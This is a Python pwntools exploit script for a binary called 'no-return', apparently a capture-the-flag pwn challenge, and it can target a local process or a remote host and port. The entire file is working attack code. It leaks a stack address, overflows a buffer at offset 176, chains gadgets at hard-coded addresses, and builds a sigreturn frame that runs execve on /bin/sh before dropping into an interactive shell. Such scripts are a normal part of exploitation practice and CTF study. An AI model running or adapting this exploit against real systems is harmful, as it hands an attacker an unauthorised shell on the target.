#!/usr/bin/env python3

from pwn import *

context.binary = 'no-return'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def send_data(p, data: bytes, offset: int) -> int:
    junk = data * (offset // 8)
    leak = u64(p.recv(8).ljust(8, b'\0'))

    payload  = junk
    payload += p64(0x40109b)
    payload += p64(0x40106d)

    p.send(payload)

    return leak


def main():
    p = get_process()

    offset = 176

    data  = b'/bin/sh\0'
    stack_leak = send_data(p, data, offset)
    log.info(f'Stack address leak: {hex(stack_leak)}')

    data += p64(0x40105a)
    data += p64(0x401099)

    data += p64(stack_leak - offset - 1)      # rdi
    data += p64(0)                            # rsi
    data += p64(0)                            # rbp
    data += p64(0xf)                          # rdx
    data += p64(stack_leak - offset + 8)      # rcx
    data += p64(0)                            # rbx

    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rip = 0x401099
    frame.rdi = stack_leak - offset - 8
    frame.rsi = 0
    frame.rdx = 0

    data += bytes(frame)

    for i in range(8, len(data), 8):
        send_data(p, data[i : i + 8], offset)

    payload  = b'A' * offset
    payload += p64(0x401000)
    payload += p64(stack_leak - offset + 16)  # rsp

    p.send(payload)
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
